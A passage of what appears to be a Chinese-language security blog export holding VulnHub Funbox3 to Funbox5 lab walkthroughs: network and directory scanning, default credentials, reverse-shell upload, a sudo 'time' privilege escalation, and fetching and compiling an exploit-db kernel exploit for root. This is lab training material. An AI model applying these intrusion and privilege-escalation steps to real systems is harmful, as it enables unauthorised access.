class="line">SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9</span><br><span class="line">SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\</span><br><span class="line">SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0</span><br><span class="line">SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,</span><br><span class="line">SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0</span><br><span class="line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\</span><br><span class="line">SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions</span><br><span class="line">SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x</span><br><span class="line">SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"</span><br><span class="line">SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1</span><br><span class="line">SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000</span><br><span class="line">SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0</span><br><span class="line">SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r</span><br><span class="line">SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0</span><br><span class="line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\</span><br><span class="line">SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");</span><br><span class="line">MAC Address: 08:00:27:4D:D2:73 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.09 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox3/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.177/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox3]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.177/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.177/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/17 04:38:42 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10918]</span><br><span class="line">/index.php            (Status: 200) [Size: 3468] </span><br><span class="line">/profile.php          (Status: 302) [Size: 7247] [--&gt; http://192.168.1.177/index.php]</span><br><span class="line">/header.php           (Status: 200) [Size: 1666]                                     </span><br><span class="line">/store                (Status: 301) [Size: 314] [--&gt; http://192.168.1.177/store/]    </span><br><span class="line">/admin                (Status: 301) [Size: 314] [--&gt; http://192.168.1.177/admin/]    </span><br><span class="line">/registration.php     (Status: 200) [Size: 9409]                                     </span><br><span class="line">/logout.php           (Status: 200) [Size: 75]                                       </span><br><span class="line">/robots.txt           (Status: 200) [Size: 14]                                       </span><br><span class="line">/dashboard.php        (Status: 302) [Size: 10272] [--&gt; http://192.168.1.177/index.php]</span><br><span class="line">/secret               (Status: 301) [Size: 315] [--&gt; http://192.168.1.177/secret/]    </span><br><span class="line">/leftbar.php          (Status: 200) [Size: 1837]                                      </span><br><span class="line">/forgot-password.php  (Status: 200) [Size: 2763]                                      </span><br><span class="line">/gym                  (Status: 301) [Size: 312] [--&gt; http://192.168.1.177/gym/]       </span><br><span class="line">/hitcounter.txt       (Status: 200) [Size: 1]                                         </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                       </span><br><span class="line">                                                                                      </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/17 04:42:19 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Funbox3/2.png" alt></p>
<ul>
<li>扫描<code>http://192.168.1.177/store/</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.177/store/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox3/CMSeeK]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.177/store/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.177/store/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/17 05:40:41 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/contact.php          (Status: 200) [Size: 4155]</span><br><span class="line">/index.php            (Status: 200) [Size: 3998]</span><br><span class="line">/books.php            (Status: 200) [Size: 5438]</span><br><span class="line">/admin.php            (Status: 200) [Size: 3153]</span><br><span class="line">/book.php             (Status: 200) [Size: 10]  </span><br><span class="line">/cart.php             (Status: 200) [Size: 2702]</span><br><span class="line">/template             (Status: 301) [Size: 323] [--&gt; http://192.168.1.177/store/template/]</span><br><span class="line">/purchase.php         (Status: 200) [Size: 2692]                                          </span><br><span class="line">/database             (Status: 301) [Size: 323] [--&gt; http://192.168.1.177/store/database/]</span><br><span class="line">/checkout.php         (Status: 200) [Size: 2696]                                          </span><br><span class="line">/process.php          (Status: 200) [Size: 1996]                                          </span><br><span class="line">/models               (Status: 301) [Size: 321] [--&gt; http://192.168.1.177/store/models/]  </span><br><span class="line">/functions            (Status: 301) [Size: 324] [--&gt; http://192.168.1.177/store/functions/]</span><br><span class="line">/verify.php           (Status: 200) [Size: 69]                                             </span><br><span class="line">/bootstrap            (Status: 301) [Size: 324] [--&gt; http://192.168.1.177/store/bootstrap/]</span><br><span class="line">/controllers          (Status: 301) [Size: 326] [--&gt; http://192.168.1.177/store/controllers/]</span><br><span class="line">                                                                                             </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/17 05:43:08 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<ul>
<li>访问<code>http://192.168.1.177/store/database/</code></li>
</ul>
<p><img data-src="./Funbox3/3.png" alt></p>
<ul>
<li>查看<code>readme.txt.txt</code></li>
</ul>
<p><img data-src="./Funbox3/4.png" alt></p>
<ul>
<li>发现账号密码<code>admin / admin</code></li>
</ul>
<h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p><img data-src="./Funbox3/5.png" alt></p>
<ul>
<li>发现文件上传链接</li>
</ul>
<p><img data-src="./Funbox3/6.png" alt></p>
<ul>
<li>尝试上传<code>phpinfo</code></li>
</ul>
<p><img data-src="./Funbox3/7.png" alt></p>
<p><img data-src="./Funbox3/8.png" alt></p>
<p><img data-src="./Funbox3/9.png" alt></p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li>上传<code>reverse_shell</code></li>
</ul>
<p><img data-src="./Funbox3/10.png" alt></p>
<ul>
<li>交互<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<ul>
<li>发现密码文件</li>
</ul>
<p><img data-src="./Funbox3/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat password.txt </span><br><span class="line">ssh: yxcvbnmYYY</span><br><span class="line">gym/admin: asdfghjklXXX</span><br><span class="line">/store: admin@admin.com admin</span><br></pre></td></tr></table></figure>

<ul>
<li>登录 <code>tony-ssh</code></li>
</ul>
<p><img data-src="./Funbox3/12.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li><code>sudo -l</code></li>
</ul>
<p><img data-src="./Funbox3/13.png" alt></p>
<ul>
<li><code>time</code>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/time /bin/sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox3/14.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox4</title>
    <url>/2021/07/17/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox4/</url>
    <content><![CDATA[<h1 id="Funbox4"><a href="#Funbox4" class="headerlink" title="Funbox4"></a>Funbox4</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox4</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox4]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.137	08:00:27:2c:dd:97	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.215	20:41:10:1a:04:8c	(Unknown)</span><br><span class="line">192.168.1.190	32:f9:e9:ee:d8:ba	(Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.990 seconds (128.64 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.137</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.137</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox4]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.137</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 07:56 EDT</span><br><span class="line">Nmap scan report for funbox4.lan (192.168.1.137)</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f6:b3:8f:f1:e3:b7:6c:18:ee:31:22:d3:d4:c9:5f:e6 (RSA)</span><br><span class="line">|   256 45:c2:16:fc:3e:a9:fc:32:fc:36:fb:d7:ce:4f:2b:fe (ECDSA)</span><br><span class="line">|_  256 4f:f8:46:72:22:9f:d3:10:51:9c:49:e0:76:5f:25:33 (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">110/tcp open  pop3    Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE SASL TOP RESP-CODES PIPELINING CAPA UIDL</span><br><span class="line">143/tcp open  imap    Dovecot imapd</span><br><span class="line">|_imap-capabilities: IDLE ID Pre-login more post-login LOGINDISABLEDA0001 LOGIN-REFERRALS IMAP4rev1 LITERAL+ have listed ENABLE SASL-IR OK capabilities</span><br><span class="line">MAC Address: 08:00:27:2C:DD:97 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox4/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.137/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox4]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.137/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.137/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/17 07:56:26 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 11321]</span><br><span class="line">/server-status        (Status: 403) [Size: 301]  </span><br><span class="line">                                                 </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/17 08:00:59 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Funbox4/2.png" alt></p>
<ul>
<li><p>无解的时候<code>WP</code>提示<code>ROBOTS.TXT</code>为路径，纳尼？</p>
</li>
<li><p><a href="http://192.168.1.137/ROBOTS.TXT" target="_blank" rel="noopener">http://192.168.1.137/ROBOTS.TXT</a></p>
</li>
</ul>
<p><img data-src="./Funbox4/3.png" alt></p>
<ul>
<li>继续往下，发现隐藏目录</li>
</ul>
<p><img data-src="./Funbox4/4.png" alt></p>
<p><img data-src="./Funbox4/5.png" alt></p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul>
<li>基于<a href="http://192.168.1.137/igmseklhgmrjmtherij2145236/继续进行一次目录扫描" target="_blank" rel="noopener">http://192.168.1.137/igmseklhgmrjmtherij2145236/继续进行一次目录扫描</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.137/igmseklhgmrjmtherij2145236/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox4]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.137/igmseklhgmrjmtherij2145236/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.137/igmseklhgmrjmtherij2145236/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/17 08:27:10 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/upload.php           (Status: 200) [Size: 319]</span><br><span class="line">/upload.html          (Status: 200) [Size: 297]</span><br><span class="line">/upload               (Status: 301) [Size: 342] [--&gt; http://192.168.1.137/igmseklhgmrjmtherij2145236/upload/]</span><br><span class="line">                                                                                                             </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/17 08:29:55 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img data-src="./Funbox4/6.png" alt></p>
<p><img data-src="./Funbox4/7.png" alt></p>
<p><img data-src="./Funbox4/8.png" alt></p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><img data-src="./Funbox4/9.png" alt></p>
<ul>
<li>敏感信息</li>
</ul>
<p><img data-src="./Funbox4/10.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The OS beard ist whiter and longer as Gandalfs one !</span><br><span class="line">Perhaps, its possible to get root from here. </span><br><span class="line">I doesnt look forward to see this in the writeups/walktroughs, </span><br><span class="line">but this is murpys law !</span><br><span class="line"></span><br><span class="line">Now, rockyou.txt isnt your friend. Its a little sed harder :-)</span><br><span class="line"></span><br><span class="line">If you need more brainfuck: Take this:</span><br><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++++++.&gt;++++.---.&lt;&lt;++.&gt;&gt;+++++++++.---------.+++++++++++++++++++.----.&lt;&lt;.&gt;&gt;------------.+.+++++.++++++.&lt;&lt;.&gt;&gt;-----------.++++++++++.&lt;&lt;.&gt;&gt;-------.+++.------------.--.+++++++++++++++++++.---------------.-.&lt;&lt;.&gt;&gt;+++++.+++++.&lt;&lt;++++++++++++++++++++++++++.</span><br><span class="line"></span><br><span class="line">Bit more ?</span><br><span class="line">Tm8gaGludHMgaGVyZSAhCg==</span><br><span class="line"></span><br><span class="line">Not enough ?</span><br><span class="line">KNSWC4TDNAQGM33SEB2G6ZDPOMXA====</span><br></pre></td></tr></table></figure>

<ul>
<li>解密<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></li>
</ul>
<p><img data-src="./Funbox4/11.png" alt></p>
<p><img data-src="./Funbox4/12.png" alt></p>
<p><img data-src="./Funbox4/13.png" alt></p>
<ul>
<li>无后续进展</li>
</ul>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>脏牛提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@funbox4:/var/www/html/igmseklhgmrjmtherij2145236/upload$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux funbox4 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.exploit-db.com/raw/45010</span><br><span class="line">mv 45010 45010.c</span><br><span class="line">gcc 45010.c</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox4/14.png" alt></p>
<ul>
<li>上传<code>a.out</code></li>
</ul>
<p><img data-src="./Funbox4/15.png" alt></p>
<ul>
<li>提权拿<code>Flag</code></li>
</ul>
<p><img data-src="./Funbox4/16.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox5</title>
    <url>/2021/07/20/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox5/</url>
    <content><![CDATA[<h1 id="Funbox5"><a href="#Funbox5" class="headerlink" title="Funbox5"></a>Funbox5</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox5</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox5]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.163	a4:50:46:78:16:9f	Xiaomi Communications Co Ltd</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.204	08:00:27:73:64:58	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.215	20:41:10:1a:04:8c	(Unknown)</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.943 seconds (131.76 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.204</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.204</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox5]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.204</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 20:01 EDT</span><br><span class="line">Nmap scan report for funbox5.lan (192.168.1.204)</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 af:ae:39:e2:da:bb:6f:1a:6b:04:ec:36:29:d9:0c:ea (RSA)</span><br><span class="line">|   256 1d:d7:ef:2c:85:bf:0d:fc:e2:60:85:22:42:8d:cc:4d (ECDSA)</span><br><span class="line">|_  256 a0:a4:6d:d9:ca:3e:71:a1:31:ea:a2:7e:42:63:13:74 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:73:64:58 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 200.61 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox5/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.204/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox5]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.204/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.204/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/18 20:01:24 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 11321]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 16]   </span><br><span class="line">/drupal               (Status: 301) [Size: 315] [--&gt; http://192.168.1.204/drupal/]</span><br><span class="line">/bug_report.txt       (Status: 200) [Size: 136]                                   </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                   </span><br><span class="line">                                                                                  </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/18 20:03:51 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Funbox5/2.png" alt></p>
<ul>
<li><a href="http://192.168.1.204/drupal/index.php" target="_blank" rel="noopener">http://192.168.1.204/drupal/index.php</a> 疑似<code>wordpress</code></li>
</ul>
<p><img data-src="./Funbox5/3.png" alt></p>
